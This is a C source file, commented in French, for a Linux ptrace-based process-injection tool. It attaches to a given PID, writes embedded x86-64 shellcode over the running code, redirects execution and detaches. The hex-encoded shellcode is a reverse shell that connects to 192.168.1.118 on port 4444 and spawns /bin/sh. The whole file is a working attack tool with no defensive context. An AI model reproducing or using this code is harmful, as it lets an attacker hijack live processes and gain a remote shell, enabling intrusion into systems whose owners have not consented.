#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>

//  COLLEZ VOTRE SHELLCODE ICI
unsigned char shellcode[] = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x01\x76\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

#define SHELLCODE_SIZE sizeof(shellcode)

int inject_shellcode(pid_t pid) {
    struct user_regs_struct regs;
    int i;
    long ret;
    
    // Attacher au processus
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return -1;
    }
    
    wait(NULL);
    printf("[+] Attached to process %d\n", pid);
    
    // Sauvegarder les registres
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace getregs");
        return -1;
    }
    
    printf("[+] Saved registers\n");
    printf("[+] RIP: 0x%llx\n", regs.rip);
    
    // Injecter le shellcode
    unsigned long *shellcode_ptr = (unsigned long *)shellcode;
    for (i = 0; i < SHELLCODE_SIZE; i += 8, shellcode_ptr++) {
        if (ptrace(PTRACE_POKETEXT, pid, regs.rip + i, *shellcode_ptr) == -1) {
            perror("ptrace poketext");
            return -1;
        }
    }
    
    printf("[+] Shellcode injected at 0x%llx\n", regs.rip);
    
    // Exécuter le shellcode
    regs.rip = regs.rip + 2;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace setregs");
        return -1;
    }
    
    printf("[+] Executing shellcode...\n");
    
    // Détacher
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("ptrace detach");
        return -1;
    }
    
    printf("[+] Detached. Reverse shell should connect now!\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    pid_t pid = atoi(argv[1]);
    printf("[*] Target PID: %d\n", pid);
    printf("[*] Shellcode size: %ld bytes\n", SHELLCODE_SIZE);
    
    if (inject_shellcode(pid) == 0) {
        printf("[+] Injection successful!\n");
    } else {
        printf("[-] Injection failed!\n");
        return 1;
    }
    
    return 0;
}
